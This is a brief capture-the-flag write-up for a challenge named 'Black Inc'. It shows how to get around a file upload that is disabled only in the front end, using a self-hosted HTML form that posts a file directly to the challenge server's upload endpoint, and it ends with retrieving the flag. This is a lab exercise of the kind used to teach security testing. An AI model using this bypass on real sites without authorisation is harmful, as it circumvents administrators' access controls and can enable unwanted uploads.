challenge caption :

``Black Inc is a file sharing website, however the file uploads was disabled by an administrator, can you change that or find a bypass?
``
so file upload is disabled from front-end but not removed .. 

we can try to by pass it :

this payload will open-up  a upload page at our server `we can make simple http server with python`
we can upload any thing and it will redirect us to the target 
````
<!DOCTYPE html>
<html>
<body>
<form action="http://35.240.62.111/black_inc/index.php" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>

````


request look like :

![image](https://user-images.githubusercontent.com/67979878/129141996-e30e8939-985a-42e2-903c-543c1af47ea3.png)



## now we can see flag after we got redirected 



